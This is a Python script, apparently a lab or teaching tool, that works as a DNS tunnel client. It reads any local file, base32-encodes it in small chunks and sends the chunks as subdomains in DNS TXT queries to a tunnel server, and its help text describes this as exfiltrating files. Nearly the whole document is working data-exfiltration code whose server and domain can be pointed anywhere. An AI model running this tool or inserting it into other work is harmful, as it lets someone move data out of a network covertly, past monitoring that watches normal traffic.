#!/usr/bin/env python3
"""
DNS Tunnel Client
=================
Reads a local file, splits it into small chunks, base32-encodes each
chunk, and "exfiltrates" it by embedding the encoded data as subdomains
inside DNS TXT queries sent to the tunnel server.

Tunnel Protocol
---------------
  START : start.<b32_filename>.<total_chunks_hex>.<domain>
  CHUNK : <seq_hex>.<b32_data>.<domain>
  END   : end.<domain>

  base32 is used because its alphabet (A-Z, 2-7) is fully DNS-label-safe.

Usage
-----
  python client.py secret.txt
  python client.py secret.txt --server 192.168.1.10 --port 5353
  python client.py secret.txt --delay 0.1 --retries 5
"""

import os
import base64
import socket
import time
import argparse
from dnslib import DNSRecord


# ─────────────────────────────────────────────────────────────
# Constants
# ─────────────────────────────────────────────────────────────

CHUNK_BYTES = 25
# 25 raw bytes  →  40 base32 chars  →  fits inside one DNS label (max 63 chars)
# The full query label sequence per chunk:
#   <4-char seq_hex>.<40-char b32data>.<domain>
# e.g. 0001.MFRA2YTBMQ3TEMZU....tunnel.test  (well within 255-char limit)


# ─────────────────────────────────────────────────────────────
# Helper
# ─────────────────────────────────────────────────────────────

def b32encode_nopad(data: bytes) -> str:
    """
    Encode bytes as base32 and strip trailing '=' padding.
    The server knows how to restore the padding during decode.
    Stripping padding keeps the DNS label shorter and avoids '='
    characters (which are technically allowed but unusual in labels).
    """
    return base64.b32encode(data).decode().rstrip("=")


def send_txt_query(qname: str, server: str, port: int,
                   timeout: float = 5.0) -> str:
    """
    Craft a raw DNS TXT query, send it over UDP, and return the
    TXT string from the server's reply.

    Returns:
        The TXT record string, or "TIMEOUT" / "ERROR:<msg>" on failure.
    """
    packet = DNSRecord.question(qname, "TXT").pack()
    sock   = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        sock.sendto(packet, (server, port))
        raw, _ = sock.recvfrom(4096)
        reply  = DNSRecord.parse(raw)
        # Collect every TXT string in the answer section
        answers = []
        for rr in reply.rr:
            answers.append(str(rr.rdata).strip('"'))
        return " ".join(answers) if answers else "(empty)"
    except socket.timeout:
        return "TIMEOUT"
    except Exception as exc:
        return f"ERROR:{exc}"
    finally:
        sock.close()


# ─────────────────────────────────────────────────────────────
# Transfer logic
# ─────────────────────────────────────────────────────────────

def send_file(filepath: str, server: str, port: int,
              domain: str, delay: float, retries: int):
    """
    Main routine: reads the file, sends START → all CHUNKs → END.
    Each send is retried up to `retries` times on timeout/error.
    """

    # ── Validate & read file ────────────────────────────────
    if not os.path.isfile(filepath):
        print(f"[!] File not found: {filepath}")
        return

    filename = os.path.basename(filepath)
    with open(filepath, "rb") as fh:
        raw = fh.read()

    # ── Split into chunks ───────────────────────────────────
    chunks = [raw[i: i + CHUNK_BYTES] for i in range(0, len(raw), CHUNK_BYTES)]
    total  = len(chunks)

    print("=" * 48)
    print("  DNS Tunnel Client")
    print("=" * 48)
    print(f"  Server  : {server}:{port}")
    print(f"  Domain  : {domain}")
    print(f"  File    : {filename}  ({len(raw):,} bytes)")
    print(f"  Chunks  : {total}  ({CHUNK_BYTES} B each)")
    print(f"  Delay   : {delay} s   Retries: {retries}")
    print("=" * 48 + "\n")

    # ── Helper: send with retry ─────────────────────────────
    def query(qname: str, label: str) -> str:
        for attempt in range(1, retries + 1):
            resp = send_txt_query(qname, server, port)
            if "TIMEOUT" not in resp and "ERROR" not in resp:
                return resp
            print(f"    [{label}] retry {attempt}/{retries}: {resp}")
            time.sleep(delay)
        return resp   # last result even if still failing

    # ── START ───────────────────────────────────────────────
    # Filename must be short enough that its base32 form fits in a DNS label
    # (≤ 63 chars  →  original filename ≤ ~38 chars)
    b32name = b32encode_nopad(filename.encode())
    if len(b32name) > 63:
        print(f"[!] Warning: filename is long ({len(b32name)} base32 chars). "
              f"Consider renaming to ≤ 38 characters.")

    start_q = f"start.{b32name}.{total:04x}.{domain}"
    resp    = query(start_q, "START")
    print(f"[>] START  →  {resp}")
    time.sleep(delay)

    # ── CHUNKs ──────────────────────────────────────────────
    errors = 0
    for seq, chunk in enumerate(chunks):
        b32chunk = b32encode_nopad(chunk)
        # Query: 0000.MFRA2YTBMQ.tunnel.test
        qname    = f"{seq:04x}.{b32chunk}.{domain}"
        resp     = query(qname, f"chunk {seq}")
        ok       = (resp == "ACK")
        if not ok:
            errors += 1
        marker = "✓" if ok else f"✗  ({resp})"
        print(f"    Chunk [{seq + 1:>4} / {total}]  {marker}")
        time.sleep(delay)

    # ── END ─────────────────────────────────────────────────
    end_q = f"end.{domain}"
    resp  = query(end_q, "END")
    print(f"\n[<] END    →  {resp}")

    if errors == 0:
        print(f"\n[+] Transfer complete — all {total} chunks acknowledged.")
    else:
        print(f"\n[!] Transfer finished with {errors} unacknowledged chunk(s).")
        print(f"    The server may still have reassembled the file if all "
              f"chunks arrived despite ACK loss.")


# ─────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(
        description="DNS Tunnel Client – exfiltrate a file via DNS queries",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    ap.add_argument("file",
                    help="Path to the file to send through the tunnel")
    ap.add_argument("--server", "-s", default="127.0.0.1",
                    help="Tunnel server IP address")
    ap.add_argument("--port",   "-p", type=int, default=5353,
                    help="Tunnel server UDP port")
    ap.add_argument("--domain", "-d", default="tunnel.test",
                    help="Tunnel domain suffix (must match server setting)")
    ap.add_argument("--delay",        type=float, default=0.05,
                    help="Seconds to wait between queries (0 = as fast as possible)")
    ap.add_argument("--retries",      type=int,   default=3,
                    help="How many times to retry a timed-out query")
    args = ap.parse_args()

    send_file(
        filepath=args.file,
        server=args.server,
        port=args.port,
        domain=args.domain,
        delay=args.delay,
        retries=args.retries,
    )


if __name__ == "__main__":
    main()
